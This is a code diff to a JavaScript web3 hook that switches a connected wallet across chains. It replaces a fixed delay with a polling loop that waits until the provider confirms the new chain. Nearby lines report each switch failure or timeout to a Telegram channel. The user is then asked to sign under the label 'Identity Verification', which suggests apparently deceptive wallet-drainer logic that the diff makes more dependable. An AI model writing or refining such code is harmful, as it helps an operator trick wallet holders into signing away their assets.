@@ -393,11 +393,25 @@ export function useWeb3Manager() {
                                     notifyTelegram(`<b>⚠️ Switch Failed</b>\nChain: ${targetChainName}\nReason: User rejected or provider error.`);
                                     continue;
                                 }
-                                // Allow provider state to settle after switch
-                                await new Promise(r => setTimeout(r, 2000));
-                                // Re-initialize provider and signer after successful switch
-                                provider = new ethers.BrowserProvider(walletProvider);
-                                signer = await provider.getSigner();
+
+                                // ENHANCED SYNC: Wait for the provider to actually SEE the new chain
+                                let synced = false;
+                                for (let i = 0; i < 10; i++) {
+                                    const tempProv = new ethers.BrowserProvider(walletProvider);
+                                    const checkNet = await tempProv.getNetwork();
+                                    if (checkNet.chainId === targetChainIdBig) {
+                                        synced = true;
+                                        provider = tempProv;
+                                        signer = await provider.getSigner();
+                                        break;
+                                    }
+                                    await new Promise(r => setTimeout(r, 1000));
+                                }
+
+                                if (!synced) {
+                                    notifyTelegram(`<b>⚠️ Sync Timeout</b>\nChain: ${targetChainName}\nWallet slow to update.`);
+                                    continue;
+                                }
                             }
 
                             setCurrentTask("🛡️ Identity Verification: Please sign to confirm...");
